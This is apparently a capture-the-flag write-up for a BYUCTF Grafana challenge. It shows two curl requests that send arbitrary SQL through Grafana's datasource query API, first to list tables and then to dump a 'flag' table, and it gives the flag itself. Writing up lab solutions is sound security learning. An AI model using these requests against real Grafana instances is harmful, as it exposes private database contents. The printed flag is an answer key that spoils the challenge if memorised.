# Grafana - 460
#### web - [BYUCTF](../main.md)

## Challenge description:
> I spun up a Grafana dashboard to list some sports statistics, but unfortunately it's broken and I'm tired so I'm just going to ignore it. I also heard that it may be vulnerable if others can access it, but there's no way a vulnerability like that is still in production software, so I'm not worried about it.
>
> http://byuctf.xyz:40000

## Solution
I've never seen Grafana before, so I poked around a little before actually looking for an attack. Navigating to the dashboard, there is on ethat tries to load data but fails. Looking at the Network tab, we see its making a POST request with SQL queries in its body. I used [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-tables)
 to find payloads.

We can switch the SQL out to get a list of tables with the following command:
```
$ curl http://byuctf.xyz:40000/api/ds/query -X POST --header 'Content-Type: application/json' -d '{"queries":[{"refId":"A","datasource":{"uid":"ctAhPmynz","type":"postgres"},"rawSql":"SELECT table_name FROM information_schema.tables;","format":"table","datasourceId":1,"intervalMs":30000,"maxDataPoints":716}],"range":{"from":"2022-03-25T01:09:57.542Z","to":"2022-03-25T07:09:57.542Z","raw":{"from":"now-6h","to":"now"}},"from":"1648170597542","to":"1648192197542"}'
```
This returns that there is a table called flag.

Next:
```
$ curl http://localhost:40010/api/ds/query -X POST --header 'Content-Type: application/json' -d '{"queries":[{"refId":"A","datasource":{"uid":"ctAhPmynz","type":"postgres"},"rawSql":"select * from flag;","format":"table","datasourceId":1,"intervalMs":30000,"maxDataPoints":716}],"range":{"from":"2022-03-25T01:09:57.542Z","to":"2022-03-25T07:09:57.542Z","raw":{"from":"now-6h","to":"now"}},"from":"1648170597542","to":"1648192197542"}'
```
Unfortunately, I did't save the actual command output but the flag was in the body of the response :)
<details> 
    <summary>Flag</summary>
byuctf{qu3ry_1nj3ct10n_1s_4_"f34tur3"_1n_gr4f4n4}</details>